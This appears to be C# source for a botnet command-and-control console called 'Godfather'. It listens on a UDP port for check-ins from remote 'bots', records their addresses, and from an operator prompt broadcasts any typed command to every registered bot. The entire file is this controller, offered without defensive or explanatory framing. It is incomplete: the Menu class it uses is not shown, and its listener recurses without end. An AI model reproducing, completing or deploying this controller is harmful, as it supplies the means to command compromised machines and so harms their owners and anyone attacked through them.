using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace Godfather
{
    class Program
    {

        private static Socket s;
        public static Menu m;


        static void Main(string[] args)
        {
            setup();
            m.renderIntro();

            s = new Socket(AddressFamily.InterNetworkV6, SocketType.Dgram, ProtocolType.Udp);
            s.SetSocketOption(SocketOptionLevel.IPv6, SocketOptionName.IPv6Only, false);
            s.Bind(new IPEndPoint(IPAddress.IPv6Any, 14567));

            Task t = Task.Factory.StartNew(Listen);

            handleMenu();
        }

        public static void sendCmd(string cmd)
        {
            Socket s = new Socket(AddressFamily.InterNetworkV6, SocketType.Dgram, ProtocolType.Udp);
            s.SetSocketOption(SocketOptionLevel.IPv6, SocketOptionName.IPv6Only, false);
            foreach (string b in Directory.GetFiles("./bots/"))
            {
                string s1 = b.Substring(7);
                if (s1.Contains("ffff")) s1 = s1.Substring(7);
                int i = s1.Split(';').Last().Length + 1;
                s1 = s1.Remove(s1.Length - i, i);

                IPEndPoint ipep = new IPEndPoint(IPAddress.Parse(s1.Replace(';',':')), 14568);
                Byte[] data = Encoding.ASCII.GetBytes(cmd);
                s.SendTo(data, ipep);
            }
        }

        public static void Listen()
        {
            IPEndPoint ipep = new IPEndPoint(IPAddress.IPv6Any, 0);
            EndPoint ep = ipep as EndPoint;
            Byte[] data = new Byte[65535];
            s.ReceiveFrom(data, ref ep);
            List<Byte> bytes = new List<Byte>(data);
            bytes.RemoveAll(b => b == 0);
            string str = Encoding.ASCII.GetString(bytes.ToArray());
            if(str=="connection")
            {
                Console.WriteLine("new connection from " + ep.ToString() + " port: " + ipep.Port);
                string fn = ep.ToString().Replace(':',';').Replace("[","").Replace("]","");

                if (!File.Exists("./bots/" + fn)) { File.Create("./bots/" + fn); }
            }
            Listen();
        }

        public static void setup()
        {
            m = new Menu();

            if (Directory.Exists("./bots/")) return;

            Directory.CreateDirectory("./bots/");
        }


        public static void handleMenu()
        {
            bool inMenu = true;
            while (inMenu)
            {
                Console.Write("$- ");
                string res = Console.ReadLine();
                switch (res)
                {
                    case "bots":
                        Console.WriteLine("List of connected bots:");
                        Console.WriteLine("--------------------");
                        foreach (string b in Directory.GetFiles("./bots/"))
                        {
                            string s1 = b.Substring(7);
                            if (s1.Contains("ffff")) s1 = s1.Substring(7);
                            int i = s1.Split(';').Last().Length + 1;
                            s1 = s1.Remove(s1.Length - i, i);
                            Console.WriteLine("- "+ s1.Replace(';', ':'));
                        }
                        Console.WriteLine("--------------------");
                        break;
                    case "execute":
                        Console.WriteLine("type 'exit' to leave");
                        bool inExecutable = true;
                        while (inExecutable)
                        {
                            string exe = Console.ReadLine();
                            if (exe == "exit")
                            {
                                inExecutable = false;
                                break;
                            }
                            else
                            {
                                sendCmd(exe);
                            }
                        }
                        break;
                    case "reset":
                        if (Directory.Exists("./bots/")) {
                            var dir = new DirectoryInfo("./bots/");
                            dir.Delete(true);
                            Directory.CreateDirectory("./bots/");
                            Console.WriteLine("Successfully deleted");
                        }
                        break;
                    default:
                        Console.WriteLine("unknown command "+ res);
                        break;
                }
            }
        }
    }
}
